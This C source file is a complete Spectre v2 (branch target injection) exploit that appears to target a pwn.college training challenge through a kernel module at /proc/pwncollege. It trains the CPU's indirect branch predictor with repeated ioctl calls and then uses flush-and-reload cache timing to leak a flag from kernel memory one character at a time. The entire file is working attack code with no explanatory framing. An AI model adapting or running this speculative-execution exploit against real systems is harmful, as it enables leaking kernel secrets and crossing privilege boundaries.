#define _GNU_SOURCE

#include <time.h> 
#include <fcntl.h> 
#include <sys/types.h>
#include <unistd.h> 
#include <sys/mman.h> 
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdbool.h>
#include <sched.h>
#include <sys/ioctl.h>

#define CACHE_HIT_THRESHOLD 120
#define CACHE_LINE_SIZE 0x1000

int fd;
volatile char *shared_buffer;

void serialize_completely() {
    unsigned int eax, ebx, ecx, edx;
    __asm__ volatile ("cpuid"
                     : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
                     : "a" (0)
                     : "memory");
}

void pre_work() {
    serialize_completely();
    
    for (int j = 0; j < 256; j++) {
        uint8_t *addr = (uint8_t*)(shared_buffer + j * CACHE_LINE_SIZE);
        _mm_clflush(addr);
    }
    
    _mm_mfence();
    serialize_completely();
}

uint64_t time_access_no_flush(void *p) {
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    volatile uint8_t x = *(volatile uint8_t*)p;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

bool post_work_inner_work(int mix_i) {
    uint8_t *addr;
    size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
    
    int offset = mix_i * CACHE_LINE_SIZE;
    addr = (uint8_t*)(shared_buffer + offset);
    uint64_t t_no_flush = time_access_no_flush(addr);
    
    if (mix_i >= 32 && mix_i <= 126 && t_no_flush <= cache_hit_threshold) {
        return true;
    }
    return false;
}

void post_work(int *stats) {
    for (size_t i = 0; i < 95; i++) {
        int ascii = 32 + ((i * 73) + 13) % 95;
        if (post_work_inner_work(ascii)) {
            stats[ascii]++;
        }
    }
}

void *attach_to_kernel_mem() {
    fd = open("/proc/pwncollege", O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    char *ptr = mmap(NULL, 256 * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    // Initialize memory
    for (int i = 0; i < 256 * 0x1000; i++) {
        ptr[i] = 1;
    }
    
    return ptr;
}

void train_indirect_branch() {
    // Train the indirect branch predictor to expect 'gadget' function
    // Set shared_buffer[1] != 0 to enable training loop
    shared_buffer[1] = 100;  // Number of training iterations
    
    for (int i = 0; i < 50; i++) {
        shared_buffer[0] = 0;  // Safe offset for training
        ioctl(fd, 0, 0);
    }
}

void exploit_spectre_v2(int pos) {
    // Set up for the attack
    shared_buffer[0] = pos;  // Position in flag to leak
    shared_buffer[1] = 0;    // Disable training loop for actual attack
    
    // Trigger the vulnerable ioctl
    // This will:
    // 1. Train with gadget function (due to previous calls)
    // 2. Switch to safe function
    // 3. But branch predictor might still predict gadget during speculation
    for (int i = 0; i < 200; i++) {
        ioctl(fd, 0, 0);
    }
}

void exploit(int len) {
    int *results = calloc(len + 1, sizeof(int));
    int stats[256] = {0};
    
    for (int pos = 0; pos < len; pos++) {
        printf("Attacking position %d...\n", pos);
        memset(stats, 0, sizeof(stats));
        
        for (int attempt = 0; attempt < 500; attempt++) {
            pre_work();
            
            // Train the branch predictor every few attempts
            if (attempt % 10 == 0) {
                train_indirect_branch();
            }
            
            exploit_spectre_v2(pos);
            post_work(stats);
        }
        
        // Find the most likely character
        int max_val = 0, max_char = 0;
        for (int c = 32; c <= 126; c++) {
            if (stats[c] > max_val) {
                max_val = stats[c];
                max_char = c;
            }
        }
        
        if (max_val > 5) {  // Confidence threshold
            results[pos] = max_char;
            printf("Position %d: '%c' (confidence: %d)\n", pos, max_char, max_val);
        } else {
            printf("Position %d: uncertain (max confidence: %d)\n", pos, max_val);
        }
        
        // Print current progress
        printf("Current: ");
        for (int i = 0; i <= pos; i++) {
            printf("%c", results[i] ? results[i] : '?');
        }
        printf("\n\n");
    }
    
    printf("Final result: ");
    for (int i = 0; i < len; i++) {
        printf("%c", results[i] ? results[i] : '?');
    }
    printf("\n");
    
    free(results);
}

void set_affinity() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

int main(int argc, char** argv) {
    printf("Starting Spectre v2 (BTI) attack...\n");
    
    set_affinity();
    shared_buffer = (volatile char*)attach_to_kernel_mem();
    
    printf("Memory mapped at: %p\n", shared_buffer);
    
    exploit(68);  // Adjust based on expected flag length
    
    munmap((void*)shared_buffer, 256 * 0x1000);
    close(fd);
    return 0;
}
